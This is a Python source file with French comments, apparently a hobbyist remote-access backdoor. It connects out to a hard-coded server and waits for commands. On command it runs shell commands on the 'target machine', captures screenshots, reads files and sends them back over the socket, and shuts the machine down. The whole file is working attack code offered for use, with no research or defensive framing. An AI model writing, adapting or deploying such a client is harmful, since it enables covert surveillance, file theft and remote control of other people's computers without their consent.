from subprocess import check_output
import webbrowser
import pyautogui
import socket
import time
import sys
import os

# Take a screenshot
def screen(s):
    pyautogui.screenshot("screen.png")
    myfile = open("screen.png", 'rb')
    imgData = myfile.read()
    s.sendall(imgData)
    time.sleep(1)
    s.sendall("end".encode("utf-8"))
    myfile.close()
    os.remove("screen.png")

# Get a file on the system
def getfile(s, path):
    myfile = open(path, 'rb')
    fileData = myfile.read()
    s.sendall(fileData)
    time.sleep(1)
    s.sendall("end".encode("utf-8"))
    myfile.close()


# Execute the command passed with the parameters
def execute(command, s, params):
    if any(x for x in [';', '|', '&'] if x in params):
        print("Tentative d'injection de commandes !")
        sendreponse(s,b"Tentative d'injection de commandes")
    else:
        command += ' '.join(str(x) for x in params)
        print(params)
        print("DEBUG - La commande entrer est : ", command)

        try:
            execute = check_output(command, shell=True)
            sendreponse(s,execute)
        except:
            sendreponse(s,b"Erreur de commande")


# Send the response to the server
def sendreponse(s,msg):
    s.sendall(msg)
    time.sleep(1)
    s.sendall("end".encode("utf-8"))


# Help displaying help functions
def help():
    h = b"""        ls/dir <chemin> -> Lister les fichiers/dossiers
        ipconfig/ifconfig <params> -> ?
        driverquery <params> -> ?
        tasklist <params> -> ?
        web -> Lance le site futurhacker.fr
        screen -> Fait un screenshot de la machine cible
        shutdown -> Eteint la machine cible
    """
    return h

# Main function executing commands
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "192.168.14.150"
    port = 8888

    try:
        s.connect((host, port))
    except:
        print("Erreur lors de la connexion !")
        sys.exit()

    while True:
        order = s.recv(5120).decode("cp850").lower()
        print(order)
        if order:
            commands = order.split()
            if commands:
                if commands[0] in ["ls", "dir"]:
                    execute("dir ", s, commands[1:])
                elif commands[0] == "getfile":
                    getfile(s,commands[1:])
                elif commands[0] in ["ipconfig", "ifconfig"]:
                    execute("ipconfig ", s, commands[1:])
                elif commands[0] in ["lsmod", "driverquery"]:
                    execute("driverquery ", s, commands[1:])
                elif commands[0] in ["ps", "tasklist"]:
                    execute("tasklist ", s, commands[1:])
                elif commands[0] == "shutdown":
                    s.sendall("Ok!".encode("utf-8"))
                    time.sleep(1)
                    s.sendall("end".encode("utf-8"))
                    execute("shutdown -s -t 0", s, commands[1:])
                elif commands[0] in ["screen", "screenshot", "image", "picture"]:
                    screen(s)
                elif commands[0] == "web":
                    s.sendall("Ok!".encode("utf-8"))
                    time.sleep(1)
                    s.sendall("end".encode("utf-8"))
                    url = 'https://futurhacker.fr'
                    webbrowser.open_new(url)
                else:
                    sendreponse(s,help())
            else:
                sendreponse(s,help())
        else:
            sendreponse(s,help())


if __name__ == "__main__":
    main()
